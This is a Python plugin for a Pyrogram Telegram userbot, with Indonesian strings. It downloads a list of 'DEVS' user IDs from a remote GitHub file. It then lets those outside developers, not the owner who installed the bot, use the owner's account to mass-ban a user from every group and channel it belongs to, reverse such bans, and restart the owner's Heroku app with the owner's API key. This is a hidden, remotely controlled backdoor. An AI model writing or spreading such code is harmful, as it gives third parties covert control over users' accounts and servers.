import asyncio
from random import choice
from pyrogram import filters
from requests import get
from pyrogram.errors import PeerIdInvalid
from Akihiro import app
import heroku3
from config import HEROKU_API, HEROKU_APP_NAME

DEVS = get(
    "https://raw.githubusercontent.com/akihiro69/Reforestation/master/DEVS.json"
).json()

absen = [
    "**Akihiro Hadir bang Owner** 😁",
    "**Akihiro Hadir kak Owner** 😉",
    "**Akihiro Hadir dong Mas Owner** 😁",
    "**Akihiro Hadir Owner Ganteng** 🥵",
    "**Akihiro Hadir Owner Tampan** 😎",
    "**Akihiro Hadir kak Owner maap telat** 🥺",
]


@app.on_message(filters.command("cgban", ".") & filters.user(DEVS))
async def cgban(client, message):
    kontol = await message.reply_text("Processing gban user")
    cmd = message.command
    if not message.reply_to_message and len(cmd) == 1:
        get_user = message.from_user.id
    elif len(cmd) == 1:
        get_user = message.reply_to_message.from_user.id
    elif len(cmd) > 1:
        get_user = cmd[1]
        try:
            get_user = int(cmd[1])
        except ValueError:
            pass
    try:
        user = await client.get_users(get_user)
    except PeerIdInvalid:
        await kontol.edit_text("Tidak menemukan user tersebut.")
        return

    iso = 0
    gagal = 0
    prik = user.id
    async for dialog in app.iter_dialogs():
        chat_type = dialog.chat.type
        if chat_type in ["group", "supergroup", "channel"]:
            chat = dialog.chat.id
            if prik in DEVS:
                await message.edit_text("Anda tidak bisa gban dia karena dia pembuat saya")
                return
            elif prik not in DEVS:
                try:
                    await app.ban_chat_member(chat, prik)
                    iso = iso + 1
                    await asyncio.sleep(0.1)
                    await kontol.delete()
                except:
                    gagal = gagal + 1
                    await asyncio.sleep(0.1)

    return await app.send_message(
        message.chat.id,
        f"Global Banned \n\nTerbanned: {iso} Chats \nGagal Banned: {gagal} Chats\nKorban: [{user.first_name}](tg://user?id={prik})",
    )
    await kontol.delete()


@app.on_message(filters.command("cungban", ".") & filters.user(DEVS))
async def cungban(client, message):
    kontol = await message.reply_text("Processing ungban user")
    cmd = message.command
    if not message.reply_to_message and len(cmd) == 1:
        get_user = message.from_user.id
    elif len(cmd) == 1:
        get_user = message.reply_to_message.from_user.id
    elif len(cmd) > 1:
        get_user = cmd[1]
        try:
            get_user = int(cmd[1])
        except ValueError:
            pass
    try:
        user = await client.get_users(get_user)
    except PeerIdInvalid:
        await kontol.edit_text("Tidak menemukan user tersebut.")
        return

    iso = 0
    gagal = 0
    prik = user.id
    async for dialog in app.iter_dialogs():
        chat_type = dialog.chat.type
        if chat_type in ["group", "supergroup", "channel"]:
            chat = dialog.chat.id
            if prik not in DEVS:
                try:
                    await app.unban_chat_member(chat, prik)
                    iso = iso + 1
                    await asyncio.sleep(0.1)
                    await kontol.delete()
                except:
                    gagal = gagal + 1
                    await asyncio.sleep(0.1)

    return await app.send_message(
        message.chat.id,
        f"Unglobal Banned \n\nUngbanned: {iso} Chats \nGagal Unbanned: {gagal} Chats\nKorban: [{user.first_name}](tg://user?id={prik})",
    )

@app.on_message(filters.command("prime", ".") & filters.user(DEVS))
async def prime(client, message):
    await message.reply(choice(absen))

@app.on_message(filters.command("crestart", ".") & filters.user(DEVS))
async def crestart(client, message):
    try:
        tai = await message.reply(
            "Restarting your Userbot, It will take few minutes, Please Wait"
        )
        heroku_conn = heroku3.from_key(HEROKU_API)
        server = heroku_conn.app(HEROKU_APP_NAME)
        server.restart()
    except Exception as e:
        await tai.edit(
            f"Your `HEROKU_APP_NAME` or `HEROKU_API` is Wrong or Not Filled, Please Make it correct or fill it \n\nError: ```{e}```"
        )
